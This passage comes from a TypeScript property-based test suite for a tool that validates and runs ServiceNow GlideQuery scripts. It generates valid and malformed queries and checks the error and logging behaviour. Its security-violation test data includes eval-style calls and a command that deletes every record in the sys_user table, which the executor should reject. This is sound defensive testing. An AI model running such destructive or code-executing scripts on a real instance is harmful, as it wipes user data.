              `new GlideQuery('${table}').get('${sysId}')`
            ),
            
            // Queries with orderBy
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              orderField: fc.constantFrom('sys_created_on', 'sys_updated_on', 'priority', 'number', 'state'),
              descending: fc.boolean()
            }).map(({ table, orderField, descending }) => 
              descending 
                ? `new GlideQuery('${table}').orderByDesc('${orderField}').select()`
                : `new GlideQuery('${table}').orderBy('${orderField}').select()`
            ),
            
            // Queries with limit
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request'),
              limit: fc.integer({ min: 1, max: 100 })
            }).map(({ table, limit }) => 
              `new GlideQuery('${table}').limit(${limit}).select()`
            ),
            
            // Queries with whereNull/whereNotNull
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request'),
              field: fc.constantFrom('assigned_to', 'resolved_at', 'closed_at', 'resolved_by'),
              isNull: fc.boolean()
            }).map(({ table, field, isNull }) => 
              isNull
                ? `new GlideQuery('${table}').whereNull('${field}').select()`
                : `new GlideQuery('${table}').whereNotNull('${field}').select()`
            ),
            
            // Queries with orWhere
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field1: fc.constantFrom('priority', 'urgency'),
              value1: fc.integer({ min: 1, max: 5 }),
              field2: fc.constantFrom('state', 'impact'),
              value2: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field1, value1, field2, value2 }) => 
              `new GlideQuery('${table}').where('${field1}', ${value1}).orWhere('${field2}', ${value2}).select()`
            ),
            
            // Queries with orWhereNull/orWhereNotNull
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field1: fc.constantFrom('assigned_to', 'resolved_by'),
              field2: fc.constantFrom('closed_at', 'resolved_at'),
              isNull: fc.boolean()
            }).map(({ table, field1, field2, isNull }) => 
              isNull
                ? `new GlideQuery('${table}').whereNull('${field1}').orWhereNull('${field2}').select()`
                : `new GlideQuery('${table}').whereNotNull('${field1}').orWhereNotNull('${field2}').select()`
            ),
            
            // Complex valid queries with multiple where clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              value2: fc.integer({ min: 1, max: 5 }),
              orderField: fc.constantFrom('sys_created_on', 'number', 'priority'),
              limit: fc.integer({ min: 1, max: 50 })
            }).map(({ table, field1, value1, field2, value2, orderField, limit }) => 
              `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', ${value2}).orderBy('${orderField}').limit(${limit}).select()`
            ),
            
            // Write operations - insert (syntactically valid)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              description: fc.string({ minLength: 10, maxLength: 100 }).map(s => s.replace(/'/g, "\\'")),
              urgency: fc.integer({ min: 1, max: 3 })
            }).map(({ table, description, urgency }) => 
              `new GlideQuery('${table}').insert({ short_description: '${description}', urgency: ${urgency} })`
            ),
            
            // Update operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task', 'change_request'),
              whereField: fc.constantFrom('number', 'sys_id'),
              whereValue: fc.hexaString({ minLength: 10, maxLength: 32 }),
              updateField: fc.constantFrom('state', 'priority', 'urgency'),
              updateValue: fc.integer({ min: 1, max: 7 })
            }).map(({ table, whereField, whereValue, updateField, updateValue }) => 
              `new GlideQuery('${table}').where('${whereField}', '${whereValue}').update({ ${updateField}: ${updateValue} })`
            ),
            
            // UpdateMultiple operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              whereField: fc.constantFrom('active', 'state', 'priority'),
              whereValue: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 })),
              updateField: fc.constantFrom('state', 'priority'),
              updateValue: fc.integer({ min: 1, max: 7 })
            }).map(({ table, whereField, whereValue, updateField, updateValue }) => 
              `new GlideQuery('${table}').where('${whereField}', ${JSON.stringify(whereValue)}).updateMultiple({ ${updateField}: ${updateValue} })`
            ),
            
            // DeleteMultiple operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('state', 'active', 'priority'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 7 }))
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).deleteMultiple()`
            ),
            
            // InsertOrUpdate operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 }),
              field: fc.constantFrom('state', 'priority'),
              value: fc.integer({ min: 1, max: 7 })
            }).map(({ table, sysId, field, value }) => 
              `new GlideQuery('${table}').insertOrUpdate({ sys_id: '${sysId}', ${field}: ${value} })`
            ),
            
            // Queries with modifiers
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              modifier: fc.constantFrom('disableWorkflow', 'withAcls', 'disableAutoSysFields', 'forceUpdate', 'withSecurityDataFilters')
            }).map(({ table, modifier }) => 
              `new GlideQuery('${table}').where('active', true).${modifier}().select()`
            ),
            
            // Queries with multiple modifiers
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              modifier1: fc.constantFrom('disableWorkflow', 'withAcls'),
              modifier2: fc.constantFrom('disableAutoSysFields', 'forceUpdate')
            }).map(({ table, modifier1, modifier2 }) => 
              `new GlideQuery('${table}').where('active', true).${modifier1}().${modifier2}().select()`
            ),
            
            // GroupBy with aggregate
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              groupField: fc.constantFrom('assigned_to', 'caller_id', 'priority', 'state')
            }).map(({ table, groupField }) => 
              `new GlideQuery('${table}').groupBy('${groupField}').aggregate('COUNT', '*')`
            ),
            
            // GroupBy with having
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              groupField: fc.constantFrom('assigned_to', 'priority', 'state'),
              operator: fc.constantFrom('>', '>=', '<', '<=', '=', '!='),
              value: fc.integer({ min: 1, max: 10 })
            }).map(({ table, groupField, operator, value }) => 
              `new GlideQuery('${table}').groupBy('${groupField}').having('COUNT', '*', '${operator}', ${value})`
            ),
            
            // Dot-walking (reference field traversal)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              referenceField: fc.constantFrom('caller_id', 'assigned_to', 'opened_by'),
              referencedField: fc.constantFrom('department', 'active', 'name', 'email'),
              value: fc.string({ minLength: 1, maxLength: 20 })
            }).map(({ table, referenceField, referencedField, value }) => 
              `new GlideQuery('${table}').where('${referenceField}.${referencedField}', '${value}').select()`
            ),
            
            // Parse encoded query
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              encodedQuery: fc.constantFrom('active=true', 'priority<=3', 'state=1^priority=1')
            }).map(({ table, encodedQuery }) => 
              `GlideQuery.parse('${table}', '${encodedQuery}').select()`
            ),
            
            // Complex multi-line valid queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              operator2: fc.constantFrom('<=', '<', '='),
              value2: fc.integer({ min: 1, max: 5 }),
              nullField: fc.constantFrom('assigned_to', 'resolved_at'),
              orderField: fc.constantFrom('sys_created_on', 'priority'),
              limit: fc.integer({ min: 1, max: 100 }),
              modifier: fc.constantFrom('withAcls', 'disableWorkflow')
            }).map(({ table, field1, value1, field2, operator2, value2, nullField, orderField, limit, modifier }) => 
              `new GlideQuery('${table}')
  .where('${field1}', ${value1})
  .where('${field2}', '${operator2}', ${value2})
  .whereNotNull('${nullField}')
  .orderByDesc('${orderField}')
  .limit(${limit})
  .${modifier}()
  .select('number', 'short_description', 'assigned_to$DISPLAY')`
            )
          ),
          async (script) => {
            // Call the validate method
            const result = executor.validate(script);

            // Property 14: Valid snippet confirmation
            // For any syntactically valid GlideQuery snippet,
            // the Validator should return valid=true with no errors
            expect(result).toBeDefined();
            expect(result.valid).toBe(true);
            
            // Critical: No errors should be present
            expect(result.errors).toBeUndefined();
            
            // Warnings are allowed (e.g., for Optional.get() usage, GlideRecord patterns)
            // but the script should still be considered valid
            // Warnings don't make a script invalid, only errors do
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 12: Syntax error detection
  // **Validates: Requirements 3.1**
  describe('Property 12: Syntax error detection', () => {
    it('should return valid=false and include error descriptions for any GlideQuery snippet with syntax errors', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate GlideQuery snippets with various syntax errors
          fc.oneof(
            // Undefined methods - common mistakes
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              undefinedMethod: fc.constantFrom('selectAll', 'findOne', 'find', 'query', 'addQuery', 'addEncodedQuery', 'next', 'getValue', 'setValue')
            }).map(({ table, undefinedMethod }) => ({
              script: `new GlideQuery('${table}').${undefinedMethod}()`,
              errorType: 'undefined_method',
              expectedError: undefinedMethod
            })),
            
            // Undefined methods with where clause
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('active', 'state', 'priority'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 })),
              undefinedMethod: fc.constantFrom('selectAll', 'findOne', 'query')
            }).map(({ table, field, value, undefinedMethod }) => ({
              script: `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).${undefinedMethod}()`,
              errorType: 'undefined_method',
              expectedError: undefinedMethod
            })),
            
            // Incorrect chaining - terminal operations called multiple times
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              terminalOp1: fc.constantFrom('select', 'selectOne', 'count', 'get'),
              terminalOp2: fc.constantFrom('select', 'count', 'avg', 'sum')
            }).map(({ table, terminalOp1, terminalOp2 }) => {
              let script: string;
              if (terminalOp1 === 'get') {
                script = `new GlideQuery('${table}').${terminalOp1}('sys_id_value').${terminalOp2}()`;
              } else if (terminalOp1 === 'selectOne') {
                script = `new GlideQuery('${table}').${terminalOp1}('number').${terminalOp2}()`;
              } else if (terminalOp1 === 'select') {
                script = `new GlideQuery('${table}').${terminalOp1}('number').${terminalOp2}()`;
              } else {
                script = `new GlideQuery('${table}').${terminalOp1}().${terminalOp2}()`;
              }
              return {
                script,
                errorType: 'incorrect_chaining',
                expectedError: 'Cannot chain terminal operations'
              };
            }),
            
            // Invalid operators
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('priority', 'state', 'urgency', 'impact'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OPERATOR', 'WRONG_OP', 'EQUALS', 'NOTEQUALS', 'GREATERTHAN', 'LESSTHAN')
            }).map(({ table, field, invalidOperator }) => ({
              script: `new GlideQuery('${table}').where('${field}', '${invalidOperator}', 3).select()`,
              errorType: 'invalid_operator',
              expectedError: invalidOperator
            })),
            
            // Invalid operators with multiple where clauses
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              invalidOperator: fc.constantFrom('INVALID', 'BAD_OP', 'WRONG')
            }).map(({ table, field1, value1, field2, invalidOperator }) => ({
              script: `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', '${invalidOperator}', 3).select()`,
              errorType: 'invalid_operator',
              expectedError: invalidOperator
            })),
            
            // Invalid field flags
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('assigned_to', 'caller_id', 'opened_by', 'resolved_by'),
              invalidFlag: fc.constantFrom('$INVALID', '$BAD_FLAG', '$WRONG', '$UNKNOWN', '$VALUE', '$NAME')
            }).map(({ table, field, invalidFlag }) => ({
              script: `new GlideQuery('${table}').select('${field}${invalidFlag}')`,
              errorType: 'invalid_field_flag',
              expectedError: invalidFlag
            })),
            
            // Multiple invalid field flags
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              field1: fc.constantFrom('assigned_to', 'caller_id'),
              invalidFlag1: fc.constantFrom('$INVALID', '$BAD'),
              field2: fc.constantFrom('opened_by', 'resolved_by'),
              invalidFlag2: fc.constantFrom('$WRONG', '$UNKNOWN')
            }).map(({ table, field1, invalidFlag1, field2, invalidFlag2 }) => ({
              script: `new GlideQuery('${table}').select('${field1}${invalidFlag1}', '${field2}${invalidFlag2}')`,
              errorType: 'invalid_field_flag',
              expectedError: invalidFlag1 // At least one should be detected
            })),
            
            // GlideRecord patterns (should generate warnings)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              operation: fc.constantFrom('query', 'next', 'getValue', 'setValue', 'addQuery')
            }).map(({ table, operation }) => ({
              script: `var gr = new GlideRecord('${table}'); gr.${operation}();`,
              errorType: 'gliderecord_pattern',
              expectedError: 'GlideRecord'
            })),
            
            // Missing parentheses on method calls
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              method: fc.constantFrom('select', 'count', 'selectOne')
            }).map(({ table, method }) => ({
              script: `new GlideQuery('${table}').${method}`,
              errorType: 'missing_parentheses',
              expectedError: method
            })),
            
            // Unsafe Optional.get() usage
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('number', 'sys_id', 'short_description')
            }).map(({ table, field }) => ({
              script: `new GlideQuery('${table}').selectOne('${field}').get()`,
              errorType: 'unsafe_optional_get',
              expectedError: '.get() on Optional'
            })),
            
            // Multiple syntax errors in one script
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              undefinedMethod: fc.constantFrom('selectAll', 'findOne'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OP')
            }).map(({ table, undefinedMethod, invalidOperator }) => ({
              script: `new GlideQuery('${table}').where('priority', '${invalidOperator}', 3).${undefinedMethod}()`,
              errorType: 'multiple_errors',
              expectedError: undefinedMethod // At least one should be detected
            })),
            
            // Complex chaining errors
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request')
            }).map(({ table }) => ({
              script: `new GlideQuery('${table}').select('number').count().avg('priority')`,
              errorType: 'multiple_terminal_ops',
              expectedError: 'Cannot chain terminal operations'
            })),
            
            // Invalid operators in orWhere
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field1: fc.constantFrom('priority', 'urgency'),
              value1: fc.integer({ min: 1, max: 5 }),
              field2: fc.constantFrom('state', 'impact'),
              invalidOperator: fc.constantFrom('INVALID', 'WRONG_OP')
            }).map(({ table, field1, value1, field2, invalidOperator }) => ({
              script: `new GlideQuery('${table}').where('${field1}', ${value1}).orWhere('${field2}', '${invalidOperator}', 2).select()`,
              errorType: 'invalid_operator',
              expectedError: invalidOperator
            })),
            
            // Invalid operators in having clause
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('assigned_to', 'caller_id', 'opened_by'),
              invalidOperator: fc.constantFrom('INVALID_OP', 'BAD_OP', 'WRONG')
            }).map(({ table, field, invalidOperator }) => ({
              script: `new GlideQuery('${table}').groupBy('${field}').having('COUNT', '*', '${invalidOperator}', 5)`,
              errorType: 'invalid_operator',
              expectedError: invalidOperator // The third parameter is the operator in having()
            }))
          ),
          async ({ script, errorType, expectedError }) => {
            // Call the validate method (not execute)
            const result = executor.validate(script);

            // Property 12: Syntax error detection
            // For any GlideQuery snippet with syntax errors,
            // the Validator should return valid=false and include error descriptions
            expect(result).toBeDefined();
            
            // Note: Some issues generate warnings (field flags, GlideRecord, Optional.get())
            // rather than errors, so valid may be true but warnings should be present
            // For actual syntax errors (undefined methods, invalid operators, chaining), valid should be false
            
            // Should have errors or warnings
            const hasErrorsOrWarnings = (result.errors && result.errors.length > 0) || 
                                       (result.warnings && result.warnings.length > 0);
            expect(hasErrorsOrWarnings).toBe(true);
            
            // For error types that should make valid=false
            const shouldBeInvalid = errorType === 'undefined_method' || 
                                   errorType === 'incorrect_chaining' || 
                                   errorType === 'multiple_terminal_ops' || 
                                   errorType === 'invalid_operator' ||
                                   errorType === 'multiple_errors';
            
            if (shouldBeInvalid) {
              expect(result.valid).toBe(false);
            }
            
            // Check for specific error types
            if (errorType === 'undefined_method') {
              // Should have error about undefined method
              expect(result.errors).toBeDefined();
              expect(result.errors!.length).toBeGreaterThan(0);
              
              const hasUndefinedMethodError = result.errors!.some(e => 
                e.message.includes('Undefined method') && 
                e.message.includes(expectedError)
              );
              expect(hasUndefinedMethodError).toBe(true);
              
              // Should include line number
              const errorWithLine = result.errors!.find(e => 
                e.message.includes(expectedError)
              );
              expect(errorWithLine).toBeDefined();
              expect(errorWithLine!.line).toBeDefined();
              expect(errorWithLine!.line).toBeGreaterThan(0);
              
            } else if (errorType === 'incorrect_chaining' || errorType === 'multiple_terminal_ops') {
              // Should have error about chaining terminal operations
              expect(result.errors).toBeDefined();
              expect(result.errors!.length).toBeGreaterThan(0);
              
              const hasChainingError = result.errors!.some(e => 
                e.message.includes('Cannot chain terminal operations')
              );
              expect(hasChainingError).toBe(true);
              
              // Should include line number
              const errorWithLine = result.errors!.find(e => 
                e.message.includes('Cannot chain terminal operations')
              );
              expect(errorWithLine).toBeDefined();
              expect(errorWithLine!.line).toBeDefined();
              expect(errorWithLine!.line).toBeGreaterThan(0);
              
            } else if (errorType === 'invalid_operator') {
              // Should have error about invalid operator
              expect(result.errors).toBeDefined();
              expect(result.errors!.length).toBeGreaterThan(0);
              
              const hasInvalidOperatorError = result.errors!.some(e => 
                e.message.includes('Invalid operator') && 
                e.message.includes(expectedError)
              );
              expect(hasInvalidOperatorError).toBe(true);
              
              // Should include line number
              const errorWithLine = result.errors!.find(e => 
                e.message.includes('Invalid operator')
              );
              expect(errorWithLine).toBeDefined();
              expect(errorWithLine!.line).toBeDefined();
              expect(errorWithLine!.line).toBeGreaterThan(0);
              
            } else if (errorType === 'invalid_field_flag') {
              // Should have warning about invalid field flag
              expect(result.warnings).toBeDefined();
              expect(result.warnings!.length).toBeGreaterThan(0);
              
              const hasInvalidFlagWarning = result.warnings!.some(w => 
                w.includes('Unknown field flag') && 
                w.includes(expectedError)
              );
              expect(hasInvalidFlagWarning).toBe(true);
              
            } else if (errorType === 'gliderecord_pattern') {
              // Should have warning about GlideRecord usage
              expect(result.warnings).toBeDefined();
              expect(result.warnings!.length).toBeGreaterThan(0);
              
              const hasGlideRecordWarning = result.warnings!.some(w => 
                w.includes('GlideRecord detected') || 
                w.includes('GlideRecord')
              );
              expect(hasGlideRecordWarning).toBe(true);
              
            } else if (errorType === 'missing_parentheses') {
              // Should have warning about missing parentheses
              expect(result.warnings).toBeDefined();
              expect(result.warnings!.length).toBeGreaterThan(0);
              
              const hasMissingParenthesesWarning = result.warnings!.some(w => 
                w.includes('missing parentheses') && 
                w.includes(expectedError)
              );
              expect(hasMissingParenthesesWarning).toBe(true);
              
            } else if (errorType === 'unsafe_optional_get') {
              // Should have warning about unsafe Optional.get()
              expect(result.warnings).toBeDefined();
              expect(result.warnings!.length).toBeGreaterThan(0);
              
              const hasOptionalWarning = result.warnings!.some(w => 
                w.includes('.get() on Optional') || 
                w.includes('.isPresent()') || 
                w.includes('.orElse()')
              );
              expect(hasOptionalWarning).toBe(true);
              
            } else if (errorType === 'multiple_errors') {
              // Should have multiple errors
              const totalIssues = (result.errors?.length || 0) + (result.warnings?.length || 0);
              expect(totalIssues).toBeGreaterThan(0);
            }
            
            // Verify that error messages are descriptive (not empty)
            if (result.errors) {
              for (const error of result.errors) {
                expect(error.message).toBeDefined();
                expect(error.message.length).toBeGreaterThan(0);
                expect(typeof error.message).toBe('string');
              }
            }
            
            // Verify that warnings are descriptive (not empty)
            if (result.warnings) {
              for (const warning of result.warnings) {
                expect(warning).toBeDefined();
                expect(warning.length).toBeGreaterThan(0);
                expect(typeof warning).toBe('string');
              }
            }
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });

    it('should return valid=true for syntactically valid GlideQuery snippets', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate valid GlideQuery snippets
          fc.oneof(
            // Simple select queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task', 'sys_user'),
              field: fc.constantFrom('active', 'state', 'priority', 'urgency'),
              value: fc.oneof(fc.boolean(), fc.integer({ min: 1, max: 5 }))
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', ${JSON.stringify(value)}).select()`
            ),
            
            // Select with valid operators
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('priority', 'urgency', 'impact'),
              operator: fc.constantFrom('=', '!=', '>', '>=', '<', '<=', 'IN', 'CONTAINS', 'STARTSWITH', 'ENDSWITH'),
              value: fc.integer({ min: 1, max: 5 })
            }).map(({ table, field, operator, value }) => 
              operator === 'IN' 
                ? `new GlideQuery('${table}').where('${field}', '${operator}', [${value}]).select()`
                : `new GlideQuery('${table}').where('${field}', '${operator}', ${value}).select()`
            ),
            
            // Select with valid field flags
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('assigned_to', 'caller_id', 'opened_by'),
              flag: fc.constantFrom('$DISPLAY', '$CURRENCY_CODE', '$CURRENCY_DISPLAY', '$CURRENCY_STRING')
            }).map(({ table, field, flag }) => 
              `new GlideQuery('${table}').select('${field}${flag}')`
            ),
            
            // Count queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task')
            }).map(({ table }) => 
              `new GlideQuery('${table}').count()`
            ),
            
            // Aggregate queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              aggregateType: fc.constantFrom('avg', 'sum', 'min', 'max'),
              field: fc.constantFrom('priority', 'impact', 'urgency')
            }).map(({ table, aggregateType, field }) => 
              `new GlideQuery('${table}').${aggregateType}('${field}')`
            ),
            
            // SelectOne queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('number', 'sys_id'),
              value: fc.hexaString({ minLength: 10, maxLength: 32 }) // Hex strings to avoid operator pattern matching
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').where('${field}', '${value}').selectOne()`
            ),
            
            // Get by sys_id
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              sysId: fc.hexaString({ minLength: 32, maxLength: 32 })
            }).map(({ table, sysId }) => 
              `new GlideQuery('${table}').get('${sysId}')`
            ),
            
            // Queries with orderBy
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              orderField: fc.constantFrom('sys_created_on', 'priority', 'number'),
              descending: fc.boolean()
            }).map(({ table, orderField, descending }) => 
              descending 
                ? `new GlideQuery('${table}').orderByDesc('${orderField}').select()`
                : `new GlideQuery('${table}').orderBy('${orderField}').select()`
            ),
            
            // Queries with limit
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              limit: fc.integer({ min: 1, max: 100 })
            }).map(({ table, limit }) => 
              `new GlideQuery('${table}').limit(${limit}).select()`
            ),
            
            // Queries with whereNull/whereNotNull
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              field: fc.constantFrom('assigned_to', 'resolved_at', 'closed_at'),
              isNull: fc.boolean()
            }).map(({ table, field, isNull }) => 
              isNull
                ? `new GlideQuery('${table}').whereNull('${field}').select()`
                : `new GlideQuery('${table}').whereNotNull('${field}').select()`
            ),
            
            // Complex valid queries
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field1: fc.constantFrom('active', 'state'),
              value1: fc.boolean(),
              field2: fc.constantFrom('priority', 'urgency'),
              value2: fc.integer({ min: 1, max: 5 }),
              orderField: fc.constantFrom('sys_created_on', 'number'),
              limit: fc.integer({ min: 1, max: 50 })
            }).map(({ table, field1, value1, field2, value2, orderField, limit }) => 
              `new GlideQuery('${table}').where('${field1}', ${value1}).where('${field2}', ${value2}).orderBy('${orderField}').limit(${limit}).select()`
            ),
            
            // Write operations (syntactically valid)
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              field: fc.constantFrom('short_description', 'description'),
              value: fc.string({ minLength: 10, maxLength: 100 })
            }).map(({ table, field, value }) => 
              `new GlideQuery('${table}').insert({ ${field}: '${value}', urgency: 3 })`
            ),
            
            // Update operations
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              whereField: fc.constantFrom('number', 'sys_id'),
              whereValue: fc.hexaString({ minLength: 10, maxLength: 32 }), // Hex strings to avoid operator pattern matching
              updateField: fc.constantFrom('state', 'priority'),
              updateValue: fc.integer({ min: 1, max: 5 })
            }).map(({ table, whereField, whereValue, updateField, updateValue }) => 
              `new GlideQuery('${table}').where('${whereField}', '${whereValue}').update({ ${updateField}: ${updateValue} })`
            ),
            
            // Queries with modifiers
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request'),
              modifier: fc.constantFrom('disableWorkflow', 'withAcls', 'disableAutoSysFields', 'forceUpdate')
            }).map(({ table, modifier }) => 
              `new GlideQuery('${table}').where('active', true).${modifier}().select()`
            )
          ),
          async (script) => {
            // Call the validate method
            const result = executor.validate(script);

            // Property: Valid snippets should return valid=true
            expect(result).toBeDefined();
            expect(result.valid).toBe(true);
            expect(result.errors).toBeUndefined();
            
            // Warnings are allowed (e.g., for Optional.get() usage)
            // but the script should still be considered valid
          }
        ),
        { numRuns: 100 } // Minimum 100 iterations as specified
      );
    });
  });

  // Feature: glidequery-development-tools, Property 20: Execution logging
  // **Validates: Requirements 7.3**

  describe('Property 20: Execution logging', () => {
    let consoleLogSpy: jest.SpyInstance;
    let consoleErrorSpy: jest.SpyInstance;
    let consoleWarnSpy: jest.SpyInstance;

    beforeEach(() => {
      // Spy on console methods to capture log output
      consoleLogSpy = jest.spyOn(console, 'log').mockImplementation();
      consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
      consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
    });

    afterEach(() => {
      // Restore console methods
      consoleLogSpy.mockRestore();
      consoleErrorSpy.mockRestore();
      consoleWarnSpy.mockRestore();
    });

    it('should create a log entry with timestamp, user information, and execution details for any script execution (successful or failed)', async () => {
      await fc.assert(
        fc.asyncProperty(
          // Generate various script execution scenarios
          fc.oneof(
            // Successful executions
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'change_request', 'task'),
              operation: fc.constantFrom('count', 'select', 'selectOne'),
              success: fc.constant(true)
            }).map(({ table, operation }) => ({
              script: operation === 'count' 
                ? `new GlideQuery('${table}').count()`
                : operation === 'selectOne'
                ? `new GlideQuery('${table}').where('active', true).selectOne()`
                : `new GlideQuery('${table}').where('active', true).select()`,
              shouldSucceed: true,
              testMode: false,
              timeout: undefined
            })),
            
            // Failed executions - empty script
            fc.constant({
              script: '',
              shouldSucceed: false,
              testMode: false,
              timeout: undefined
            }),
            
            // Failed executions - script too long
            fc.record({
              longScript: fc.string({ minLength: 10001, maxLength: 10100 })
            }).map(({ longScript }) => ({
              script: longScript,
              shouldSucceed: false,
              testMode: false,
              timeout: undefined
            })),
            
            // Failed executions - security violation
            fc.record({
              dangerousPattern: fc.constantFrom(
                'gs.executeNow("malicious")',
                'gs.eval("code")',
                'eval("test")',
                'new Function("code")()',
                'new GlideRecord("sys_user").deleteMultiple()'
              )
            }).map(({ dangerousPattern }) => ({
              script: dangerousPattern,
              shouldSucceed: false,
              testMode: false,
              timeout: undefined
            })),
            
            // Test mode executions
            fc.record({
              table: fc.constantFrom('incident', 'problem', 'task'),
              writeOp: fc.constantFrom('insert', 'update', 'updateMultiple')
            }).map(({ table, writeOp }) => ({
              script: writeOp === 'insert'
                ? `new GlideQuery('${table}').insert({ short_description: 'test' })`
                : writeOp === 'update'
                ? `new GlideQuery('${table}').where('number', 'INC0010001').update({ priority: 2 })`
                : `new GlideQuery('${table}').where('active', true).updateMultiple({ state: 6 })`,
              shouldSucceed: true,
              testMode: true,
              timeout: undefined
            })),
            
            // Execution with timeout
            fc.record({
              table: fc.constantFrom('incident', 'problem'),
              timeout: fc.integer({ min: 1000, max: 60000 })
            }).map(({ table, timeout }) => ({
              script: `new GlideQuery('${table}').select()`,
              shouldSucceed: true,
              testMode: false,
              timeout
            }))
          ),
          async ({ script, shouldSucceed, testMode, timeout }) => {
            // Clear console spies before each test
            consoleLogSpy.mockClear();
            consoleErrorSpy.mockClear();
            consoleWarnSpy.mockClear();
            mockClient.executeScript.mockClear();

            // Mock response for successful executions
            if (shouldSucceed && script.length > 0 && script.length <= 10000 && 
                !script.includes('gs.executeNow') && !script.includes('gs.eval') && 
                !script.includes('eval(') && !script.includes('Function(') && 
                !script.includes('GlideRecord')) {
              const mockResponse: ScriptExecutionResult = {
                success: true,
                result: script.includes('count') ? 42 : [],
                executionTime: fc.sample(fc.integer({ min: 10, max: 500 }), 1)[0]
              };
              mockClient.executeScript.mockResolvedValue(mockResponse);
            }

            // Record timestamp before execution
            const beforeExecution = Date.now();

            // Execute the script
            const result = await executor.execute(script, { 
              testMode, 
              timeout 
            });

            // Record timestamp after execution
            const afterExecution = Date.now();

            // Property: For any script execution (successful or failed),
            // a log entry should be created with timestamp, user information, and execution details

            // Verify that logging occurred
            const allLogs = [
              ...consoleLogSpy.mock.calls,
              ...consoleErrorSpy.mock.calls,
              ...consoleWarnSpy.mock.calls
            ];

            expect(allLogs.length).toBeGreaterThan(0);

            // Find log entries related to glidequery execution
            const executionLogs = allLogs.filter(call => {
              const logMessage = call[0];
              return typeof logMessage === 'string' && 
                     (logMessage.includes('glidequery_execute') || 
                      logMessage.includes('glidequery_test'));
            });

            expect(executionLogs.length).toBeGreaterThan(0);

            // Verify log entry structure
            for (const logCall of executionLogs) {
              const logMessage = logCall[0];
              
              // Check for timestamp (ISO format)
